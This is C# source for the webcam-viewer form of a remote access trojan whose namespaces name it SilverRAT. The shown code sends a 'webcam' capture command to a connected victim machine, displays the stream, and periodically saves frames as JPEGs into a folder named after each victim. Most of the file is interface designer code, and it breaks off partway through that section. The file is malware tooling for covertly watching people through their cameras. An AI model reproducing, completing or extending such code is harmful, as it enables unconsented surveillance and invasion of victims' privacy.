using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Cam : Form
{
    public int FPS = 0;

    public Stopwatch sw = Stopwatch.StartNew();

    public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

    public Size rdSize;

    public object syncPicbox = new object();

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    private System.Windows.Forms.Timer TimerSave;

    private Panel panelForm;

    public BunifuLabel logs;

    private Panel panel1;

    private Panel PanelMune;

    private BunifuCheckBox CaptureSave;

    private Label TxCaptureSave;

    public Bunifu.UI.WinForms.BunifuDropdown ListDrive;

    private Label MuneClose;

    internal Guna2HtmlLabel ValueQuality;

    public Guna2TrackBar QualityTrackBar;

    private BunifuLabel bunifuLabel17;

    public Guna2GradientButton Power;

    public PictureBox ViewerBox;

    private Guna2ResizeBox FormResizeBox1;

    private BunifuPanel PanelTitle;

    public BunifuLoader LoaderConnect;

    private Guna2GradientButton ButtonMune;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    public PictureBox pictureBox2;

    private BunifuCheckBox bunifuCheckBox_0;

    private Label label1;

    private BunifuCheckBox bunifuCheckBox1;

    private Label label2;

    private PictureBox LogoImage;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string ScreenPath { get; set; }

    public string FullPath { get; set; }

    public Image GetImage { get; set; }

    public Cam()
    {
        InitializeComponent();
        MinimumSize = base.Size;
    }

    private void Cam_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            string[] array = userIDClient.Split('\\');
            ScreenPath = Path.Combine(Application.StartupPath, "Clients", "RemoteCamera\\" + array[0] + "_" + array[1]);
            if (!Directory.Exists(ScreenPath))
            {
                Directory.CreateDirectory(ScreenPath);
                FullPath = ScreenPath;
            }
            else
            {
                FullPath = ScreenPath;
            }
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                LogoImage.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void ButtonMune_Click(object sender, EventArgs e)
    {
        if (!PanelMune.Visible)
        {
            Program.Silver.TransitionShowng.ShowSync(PanelMune);
        }
    }

    private void MuneClose_Click(object sender, EventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(PanelMune);
    }

    private void Cam_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void QualityTrackBar_Scroll(object sender, ScrollEventArgs e)
    {
        ValueQuality.Text = QualityTrackBar.Value + "% Quality";
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void Cam_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
            Close();
        }
    }

    private void TimerSave_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
            Encoder quality = Encoder.Quality;
            EncoderParameters encoderParameters = new EncoderParameters(1);
            EncoderParameter encoderParameter = new EncoderParameter(quality, 50);
            encoderParameters.Param[0] = encoderParameter;
            ImageCodecInfo encoder = GetEncoder(ImageFormat.Jpeg);
            ViewerBox.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
            encoderParameters?.Dispose();
            encoderParameter?.Dispose();
        }
        catch
        {
        }
    }

    private void CaptureSave_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (!CaptureSave.Checked || !(Power.Text == "Stop"))
        {
            return;
        }
        if (TimerSave.Enabled)
        {
            TimerSave.Stop();
            return;
        }
        TimerSave.Start();
        try
        {
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
            Process.Start(FullPath);
        }
        catch
        {
        }
    }

    private ImageCodecInfo GetEncoder(ImageFormat format)
    {
        ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
        ImageCodecInfo[] array = imageDecoders;
        int num = 0;
        ImageCodecInfo imageCodecInfo;
        while (true)
        {
            if (num < array.Length)
            {
                imageCodecInfo = array[num];
                if (imageCodecInfo.FormatID == format.Guid)
                {
                    break;
                }
                num++;
                continue;
            }
            return null;
        }
        return imageCodecInfo;
    }

    private void Power_Click(object sender, EventArgs e)
    {
        try
        {
            if (Power.Text == "Start")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "webcam";
                msgPack.ForcePathObject("Command").AsString = "capture";
                msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(QualityTrackBar.Value.ToString());
                msgPack.ForcePathObject("List").AsInteger = Convert.ToInt32(ListDrive.SelectedIndex.ToString());
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                ListDrive.Enabled = false;
                QualityTrackBar.Enabled = false;
                Power.Text = "Started...";
                Power.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Command").AsString = "stop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                ListDrive.Enabled = true;
                QualityTrackBar.Enabled = true;
                Power.Text = "Stoped...";
                Power.Enabled = false;
            }
        }
        catch
        {
            MessageBox.Show("Err Power");
        }
    }

    private void EnbledFPS_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (bunifuCheckBox_0.Checked)
        {
            logs.Visible = false;
        }
        else
        {
            logs.Visible = true;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.Cam));
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.logs = new Bunifu.UI.WinForms.BunifuLabel();
        this.panel1 = new System.Windows.Forms.Panel();
        this.PanelMune = new System.Windows.Forms.Panel();
        this.bunifuCheckBox1 = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label2 = new System.Windows.Forms.Label();
        this.bunifuCheckBox_0 = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label1 = new System.Windows.Forms.Label();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.CaptureSave = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxCaptureSave = new System.Windows.Forms.Label();
        this.ListDrive = new Bunifu.UI.WinForms.BunifuDropdown();
        this.MuneClose = new System.Windows.Forms.Label();
        this.ValueQuality = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.QualityTrackBar = new Guna.UI2.WinForms.Guna2TrackBar();
        this.bunifuLabel17 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Power = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ViewerBox = new System.Windows.Forms.PictureBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtonMune = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.LogoImage = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.TimerSave = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.panel1.SuspendLayout();
        this.PanelMune.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).BeginInit();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.LogoImage).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.logs);
        this.panelForm.Controls.Add(this.panel1);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(592, 489);
        this.panelForm.TabIndex = 572;
        this.panelForm.Visible = false;
        this.logs.AllowParentOverrides = false;
        this.logs.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.logs.AutoEllipsis = false;
        this.logs.AutoSize = false;
        this.logs.Cursor = System.Windows.Forms.Cursors.Default;
        this.logs.CursorType = System.Windows.Forms.Cursors.Default;
        this.logs.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.logs.ForeColor = System.Drawing.Color.DarkGray;
        this.logs.Location = new System.Drawing.Point(16, 466);
        this.logs.Name = "logs";
        this.logs.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.logs.Size = new System.Drawing.Size(148, 15);
        this.logs.TabIndex = 602;
        this.logs.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.logs.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.logs.Visible = false;
        this.panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panel1.Controls.Add(this.PanelMune);
        this.panel1.Controls.Add(this.ViewerBox);
        this.panel1.Location = new System.Drawing.Point(16, 112);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(562, 348);
        this.panel1.TabIndex = 601;
        this.PanelMune.Controls.Add(this.bunifuCheckBox1);
        this.PanelMune.Controls.Add(this.label2);
        this.PanelMune.Controls.Add(this.bunifuCheckBox_0);
        this.PanelMune.Controls.Add(this.label1);
        this.PanelMune.Controls.Add(this.pictureBox2);
        this.PanelMune.Controls.Add(this.CaptureSave);
        this.PanelMune.Controls.Add(this.TxCaptureSave);
        this.PanelMune.Controls.Add(this.ListDrive);
        this.PanelMune.Controls.Add(this.MuneClose);
        this.PanelMune.Controls.Add(this.ValueQuality);
        this.PanelMune.Controls.Add(this.QualityTrackBar);
        this.PanelMune.Controls.Add(this.bunifuLabel17);
        this.PanelMune.Controls.Add(this.Power);
        this.PanelMune.Dock = System.Windows.Forms.DockStyle.Right;
        this.PanelMune.Location = new System.Drawing.Point(308, 0);
        this.PanelMune.Name = "PanelMune";
        this.PanelMune.Size = new System.Drawing.Size(254, 348);
        this.PanelMune.TabIndex = 578;
        this.bunifuCheckBox1.AllowBindingControlAnimation = true;
        this.bunifuCheckBox1.AllowBindingControlColorChanges = false;
        this.bunifuCheckBox1.AllowBindingControlLocation = true;
        this.bunifuCheckBox1.AllowCheckBoxAnimation = true;
        this.bunifuCheckBox1.AllowCheckmarkAnimation = true;
        this.bunifuCheckBox1.AllowOnHoverStates = true;
        this.bunifuCheckBox1.AutoCheck = true;
        this.bunifuCheckBox1.BackColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuCheckBox1.BackgroundImage");
        this.bunifuCheckBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.bunifuCheckBox1.BindingControl = this.label2;
        this.bunifuCheckBox1.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.bunifuCheckBox1.BorderRadius = 6;
        this.bunifuCheckBox1.Checked = true;
        this.bunifuCheckBox1.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.bunifuCheckBox1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.bunifuCheckBox1.CustomCheckmarkImage = null;
        this.bunifuCheckBox1.Location = new System.Drawing.Point(8, 166);
        this.bunifuCheckBox1.MinimumSize = new System.Drawing.Size(17, 17);
        this.bunifuCheckBox1.Name = "bunifuCheckBox1";
        this.bunifuCheckBox1.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox1.OnCheck.BorderRadius = 6;
        this.bunifuCheckBox1.OnCheck.BorderThickness = 2;
        this.bunifuCheckBox1.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox1.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox1.OnCheck.CheckmarkThickness = 2;
        this.bunifuCheckBox1.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox1.OnDisable.BorderRadius = 6;
        this.bunifuCheckBox1.OnDisable.BorderThickness = 2;
        this.bunifuCheckBox1.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox1.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox1.OnDisable.CheckmarkThickness = 2;
        this.bunifuCheckBox1.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox1.OnHoverChecked.BorderRadius = 6;
        this.bunifuCheckBox1.OnHoverChecked.BorderThickness = 2;
        this.bunifuCheckBox1.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox1.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox1.OnHoverChecked.CheckmarkThickness = 2;
        this.bunifuCheckBox1.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox1.OnHoverUnchecked.BorderRadius = 6;
        this.bunifuCheckBox1.OnHoverUnchecked.BorderThickness = 1;
        this.bunifuCheckBox1.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox1.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.bunifuCheckBox1.OnUncheck.BorderRadius = 6;
        this.bunifuCheckBox1.OnUncheck.BorderThickness = 1;
        this.bunifuCheckBox1.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.bunifuCheckBox1.Size = new System.Drawing.Size(21, 21);
        this.bunifuCheckBox1.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.bunifuCheckBox1.TabIndex = 660;
        this.bunifuCheckBox1.ThreeState = false;
        this.bunifuCheckBox1.ToolTipText = null;
        this.label2.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label2.AutoSize = true;
        this.label2.BackColor = System.Drawing.Color.Transparent;
        this.label2.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label2.Enabled = false;
        this.label2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label2.ForeColor = System.Drawing.Color.Black;
        this.label2.Location = new System.Drawing.Point(32, 170);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(34, 15);
        this.label2.TabIndex = 659;
        this.label2.Text = "Flash";
        this.bunifuCheckBox_0.AllowBindingControlAnimation = true;
        this.bunifuCheckBox_0.AllowBindingControlColorChanges = false;
        this.bunifuCheckBox_0.AllowBindingControlLocation = true;
        this.bunifuCheckBox_0.AllowCheckBoxAnimation = true;
        this.bunifuCheckBox_0.AllowCheckmarkAnimation = true;
        this.bunifuCheckBox_0.AllowOnHoverStates = true;
        this.bunifuCheckBox_0.AutoCheck = true;
        this.bunifuCheckBox_0.BackColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnbledFPS.BackgroundImage");
        this.bunifuCheckBox_0.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.bunifuCheckBox_0.BindingControl = this.label1;
        this.bunifuCheckBox_0.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.bunifuCheckBox_0.BorderRadius = 6;
        this.bunifuCheckBox_0.Checked = true;
        this.bunifuCheckBox_0.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.bunifuCheckBox_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.bunifuCheckBox_0.CustomCheckmarkImage = null;
        this.bunifuCheckBox_0.Location = new System.Drawing.Point(8, 139);
        this.bunifuCheckBox_0.MinimumSize = new System.Drawing.Size(17, 17);
        this.bunifuCheckBox_0.Name = "EnbledFPS";
        this.bunifuCheckBox_0.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnCheck.BorderThickness = 2;
        this.bunifuCheckBox_0.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnCheck.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.BorderRadius = 6;
        this.bunifuCheckBox_0.OnDisable.BorderThickness = 2;
        this.bunifuCheckBox_0.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverChecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverChecked.BorderThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderThickness = 1;
        this.bunifuCheckBox_0.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.bunifuCheckBox_0.OnUncheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnUncheck.BorderThickness = 1;
        this.bunifuCheckBox_0.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.Size = new System.Drawing.Size(21, 21);
        this.bunifuCheckBox_0.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.bunifuCheckBox_0.TabIndex = 658;
        this.bunifuCheckBox_0.ThreeState = false;
        this.bunifuCheckBox_0.ToolTipText = null;
        this.bunifuCheckBox_0.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnbledFPS_CheckedChanged);
        this.label1.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label1.AutoSize = true;
        this.label1.BackColor = System.Drawing.Color.Transparent;
        this.label1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label1.ForeColor = System.Drawing.Color.Black;
        this.label1.Location = new System.Drawing.Point(32, 143);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(91, 15);
        this.label1.TabIndex = 657;
        this.label1.Text = "FPS info Disable";
        this.pictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.pictureBox2.BackColor = System.Drawing.Color.Transparent;
        this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
        this.pictureBox2.Location = new System.Drawing.Point(106, 166);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(143, 136);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox2.TabIndex = 656;
        this.pictureBox2.TabStop = false;
        this.CaptureSave.AllowBindingControlAnimation = true;
        this.CaptureSave.AllowBindingControlColorChanges = false;
        this.CaptureSave.AllowBindingControlLocation = true;
        this.CaptureSave.AllowCheckBoxAnimation = true;
        this.CaptureSave.AllowCheckmarkAnimation = true;
        this.CaptureSave.AllowOnHoverStates = true;
        this.CaptureSave.AutoCheck = true;
        this.CaptureSave.BackColor = System.Drawing.Color.Transparent;
        this.CaptureSave.BackgroundImage = (System.Drawing.Image)resources.GetObject("CaptureSave.BackgroundImage");
        this.CaptureSave.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.CaptureSave.BindingControl = this.TxCaptureSave;
        this.CaptureSave.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.CaptureSave.BorderRadius = 6;
        this.CaptureSave.Checked = false;
        this.CaptureSave.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.CaptureSave.Cursor = System.Windows.Forms.Cursors.Hand;
        this.CaptureSave.CustomCheckmarkImage = null;
        this.CaptureSave.Location = new System.Drawing.Point(8, 108);
        this.CaptureSave.MinimumSize = new System.Drawing.Size(17, 17);
        this.CaptureSave.Name = "CaptureSave";
        this.CaptureSave.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CaptureSave.OnCheck.BorderRadius = 6;
        this.CaptureSave.OnCheck.BorderThickness = 2;
        this.CaptureSave.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CaptureSave.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.CaptureSave.OnCheck.CheckmarkThickness = 2;
        this.CaptureSave.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.CaptureSave.OnDisable.BorderRadius = 6;
        this.CaptureSave.OnDisable.BorderThickness = 2;
        this.CaptureSave.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.CaptureSave.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.CaptureSave.OnDisable.CheckmarkThickness = 2;
        this.CaptureSave.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.CaptureSave.OnHoverChecked.BorderRadius = 6;
        this.CaptureSave.OnHoverChecked.BorderThickness = 2;
        this.CaptureSave.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CaptureSave.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.CaptureSave.OnHoverChecked.CheckmarkThickness = 2;
        this.CaptureSave.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.CaptureSave.OnHoverUnchecked.BorderRadius = 6;
        this.CaptureSave.OnHoverUnchecked.BorderThickness = 1;
        this.CaptureSave.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.CaptureSave.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.CaptureSave.OnUncheck.BorderRadius = 6;
        this.CaptureSave.OnUncheck.BorderThickness = 1;
        this.CaptureSave.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.CaptureSave.Size = new System.Drawing.Size(21, 21);
        this.CaptureSave.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.CaptureSave.TabIndex = 655;
        this.CaptureSave.ThreeState = false;
        this.CaptureSave.ToolTipText = null;
        this.CaptureSave.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(CaptureSave_CheckedChanged);
        this.TxCaptureSave.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxCaptureSave.AutoSize = true;
        this.TxCaptureSave.BackColor = System.Drawing.Color.Transparent;
        this.TxCaptureSave.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxCaptureSave.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxCaptureSave.ForeColor = System.Drawing.Color.Black;
        this.TxCaptureSave.Location = new System.Drawing.Point(32, 112);
        this.TxCaptureSave.Name = "TxCaptureSave";
        this.TxCaptureSave.Size = new System.Drawing.Size(121, 15);
        this.TxCaptureSave.TabIndex = 654;
        this.TxCaptureSave.Text = "Capture Save Enabled";
        this.ListDrive.BackColor = System.Drawing.Color.Transparent;
        this.ListDrive.BackgroundColor = System.Drawing.Color.White;
        this.ListDrive.BorderColor = System.Drawing.Color.Silver;
        this.ListDrive.BorderRadius = 1;
        this.ListDrive.Color = System.Drawing.Color.Silver;
        this.ListDrive.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.ListDrive.DisabledBackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.ListDrive.DisabledBorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ListDrive.DisabledColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.ListDrive.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        this.ListDrive.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.ListDrive.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.ListDrive.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.ListDrive.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ListDrive.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.ListDrive.FillDropDown = true;
        this.ListDrive.FillIndicator = false;
        this.ListDrive.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.ListDrive.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ListDrive.ForeColor = System.Drawing.Color.Black;
        this.ListDrive.FormattingEnabled = true;
        this.ListDrive.Icon = null;
        this.ListDrive.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.ListDrive.IndicatorColor = System.Drawing.Color.DarkGray;
        this.ListDrive.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.ListDrive.IndicatorThickness = 2;
        this.ListDrive.IsDropdownOpened = false;
        this.ListDrive.ItemBackColor = System.Drawing.Color.White;
        this.ListDrive.ItemBorderColor = System.Drawing.Color.White;
        this.ListDrive.ItemForeColor = System.Drawing.Color.Black;
